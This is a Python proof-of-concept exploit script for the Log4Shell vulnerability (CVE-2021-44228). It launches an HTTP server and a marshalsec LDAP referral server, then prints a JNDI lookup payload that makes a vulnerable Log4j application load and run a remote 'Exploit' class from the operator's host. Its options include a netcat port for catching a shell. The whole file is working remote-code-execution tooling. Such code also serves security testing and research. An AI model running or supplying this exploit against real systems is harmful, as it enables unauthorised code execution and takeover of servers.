#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()


def payload(userip: str, webport: int, lport: int) -> None:
    print(Fore.GREEN + "[+] Setting up LDAP server\n")

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(("0.0.0.0", webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run(
        [
            "/usr/bin/java",
            "-cp",
            os.path.join(CUR_FOLDER, "marshalsec-0.0.3-SNAPSHOT-all.jar"),
            "marshalsec.jndi.LDAPRefServer",
            url,
        ]
    )


def main() -> None:
    init(autoreset=True)
    print(
        Fore.BLUE
        + """
[!] CVE: CVE-2021-44228
[!] From Github repo: https://github.com/dguerri/log4j-shell-poc
[!] Originally from Github repo: https://github.com/kozmer/log4j-shell-poc
"""
    )

    parser = argparse.ArgumentParser(description="log4shell PoC")
    parser.add_argument(
        "--userip",
        metavar="userip",
        type=str,
        default="localhost",
        help="Enter IP for LDAPRefServer & Shell",
    )
    parser.add_argument(
        "--webport",
        metavar="webport",
        type=int,
        default="8000",
        help="listener port for HTTP port",
    )
    parser.add_argument(
        "--lport", metavar="lport", type=int, default="9001", help="Netcat Port"
    )

    args = parser.parse_args()

    try:
        payload(args.userip, args.webport, args.lport)
    except KeyboardInterrupt:
        print(Fore.RED + "user interrupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
